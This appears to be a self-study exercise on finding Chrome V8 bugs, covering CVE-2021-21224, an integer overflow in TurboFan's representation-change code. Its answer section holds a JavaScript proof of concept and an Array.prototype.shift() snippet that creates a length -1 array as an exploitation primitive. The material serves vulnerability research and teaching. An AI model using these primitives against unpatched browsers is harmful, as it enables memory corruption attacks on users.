# Exercise 2

In LEVEL 1, we can relay on Details and just to search for the func which Details mentioned. It is far away from the real bug hunting scene.

LEVEL 2 we do the same as LEVEL 1 without the help of Details.

But the bug report need Poc to assist developer reproduce the vulnerability, and know exactly what cause this bug. So LEVEL 3 need we construct Poc by ourselves.

## CVE-2021-21224
I sugget you don't search any report about it to prevents get too much info like patch.



### Details

In level 3, we do it without the help of Details


---------

<details>
  <summary>For more info click me! But you'd better not do this</summary>

  https://bugs.chromium.org/p/chromium/issues/detail?id=1195777

</details>

--------

### Set environment

Welcome to V8

if you have fetched v8, just
```sh
git reset --hard f87baad0f8b3f7fda43a01b9af3dd940dd09a9a3 
gclient sync
```
But if you not
```sh
# get depot_tools
git clone https://chromium.googlesource.com/chromium/tools/depot_tools.git
# add to env var
echo 'export PATH=$PATH:"/path/to/depot_tools"' >> ~/.bashrc
# get v8 source code
fetch v8
# chenge to right commit
cd v8
git reset --hard f87baad0f8b3f7fda43a01b9af3dd940dd09a9a3
# download others
gclient sync
```



### Related code

src/compiler/representation-change.cc

tips: Integer overflow

### Do it
Do this exercise by yourself, If you find my answer have something wrong, please correct it.


---------

<details>
  <summary>My answer</summary>

  ```c++
// The {UseInfo} class is used to describe a use of an input of a node.
//
// This information is used in two different ways, based on the phase:
//
// 1. During propagation, the use info is used to inform the input node
//    about what part of the input is used (we call this truncation) and what
//    is the preferred representation. For conversions that will require
//    checks, we also keep track of whether a minus zero check is needed.
//
// 2. During lowering, the use info is used to properly convert the input
//    to the preferred representation. The preferred representation might be
//    insufficient to do the conversion (e.g. word32->float64 conv), so we also
//    need the signedness information to produce the correct value.
//    Additionally, use info may contain {CheckParameters} which contains
//    information for the deoptimizer such as a CallIC on which speculation
//    should be disallowed if the check fails.
  ```

  When do truncation we need check the `{CheckParameters}` like `use_info.type_check() == TypeCheckKind::kSignedSmall`, and if the check fails will trigger deoptimize.

  ```c++
enum class TypeCheckKind : uint8_t {
  kNone,
  kSignedSmall,
  kSigned32,
  kSigned64,
  kNumber,
  kNumberOrBoolean,
  kNumberOrOddball,
  kHeapObject,
  kBigInt,
  kArrayIndex
};
  ```

  The reasons for bug is missing a check of `use_info`
  ```c++
Node* RepresentationChanger::GetWord32RepresentationFor(
    Node* node, MachineRepresentation output_rep, Type output_type,
    Node* use_node, UseInfo use_info) {
  // Eagerly fold representation changes for constants.
  switch (node->opcode()) {
    case IrOpcode::kInt32Constant:
    case IrOpcode::kInt64Constant:
    case IrOpcode::kFloat32Constant:
    case IrOpcode::kFloat64Constant:
      UNREACHABLE();
    case IrOpcode::kNumberConstant: {
      double const fv = OpParameter<double>(node->op());
      if (use_info.type_check() == TypeCheckKind::kNone ||
          ((use_info.type_check() == TypeCheckKind::kSignedSmall ||
            use_info.type_check() == TypeCheckKind::kSigned32 ||
            use_info.type_check() == TypeCheckKind::kNumber ||
            use_info.type_check() == TypeCheckKind::kNumberOrOddball ||
            use_info.type_check() == TypeCheckKind::kArrayIndex) &&
           IsInt32Double(fv))) {
        return MakeTruncatedInt32Constant(fv);
      }
      break;
    }
    default:
      break;
  }

  // Select the correct X -> Word32 operator.
  const Operator* op = nullptr;
  if (output_type.Is(Type::None())) {
    // This is an impossible value; it should not be used at runtime.
    return jsgraph()->graph()->NewNode(
        jsgraph()->common()->DeadValue(MachineRepresentation::kWord32), node);
  [ ... ]
  } else if (output_rep == MachineRepresentation::kWord8 ||
             output_rep == MachineRepresentation::kWord16) {
    DCHECK_EQ(MachineRepresentation::kWord32, use_info.representation());
    DCHECK(use_info.type_check() == TypeCheckKind::kSignedSmall ||
           use_info.type_check() == TypeCheckKind::kSigned32);
    return node;
  } else if (output_rep == MachineRepresentation::kWord64) {
    if (output_type.Is(Type::Signed32()) ||
        output_type.Is(Type::Unsigned32())) {
      op = machine()->TruncateInt64ToInt32();     [1]
    } else if (output_type.Is(cache_->kSafeInteger) &&
               use_info.truncation().IsUsedAsWord32()) {
      op = machine()->TruncateInt64ToInt32();
  ```
  [1] Truncate Int64 To Int32 without check. This lead to Integer overflow.

  We should search for how can we insert one `TruncateInt64ToInt32` node. I have no idea about it but I guess `kWord64` var as `Signed32` and `Unsigned32` can convert from Int64 to Int32, and we can set 0xffffffff for y(Word32) and if convert to int32 can be -1.

  **Poc**
  ```js
function foo(a)
{
    let x = -1;
    if(a) x = 0xffffffff;
    return -1 < Math.max(x,0);
}

console.log(foo(true)) //prints true
for (let i = 0; i < 0x10000; ++i) foo(false)
console.log(foo(true)) //prints false
  ```
  When construct Poc of turbofan, we need analysis turbolizer or break at `../../src/compiler/representation-change.cc:853` to know whether we get kWord64 and convert to int32. I get this poc form [there](https://iamelli0t.github.io/2021/04/20/Chromium-Issue-1196683-1195777.html#rca-of-issue-1195777)

  checkbounds—elimination had been bannde and `Array.prototype.shift()` is a trick which has been patched now, but this commit can trigger it, we can make array length == -1 by shift
  ```js
let vuln_array = new Array(0 - Math.max(0, x));
vuln_array.shift();
  ```

  full exp can be found [here](https://bugs.chromium.org/p/chromium/issues/detail?id=1195777#c15)

</details>

--------
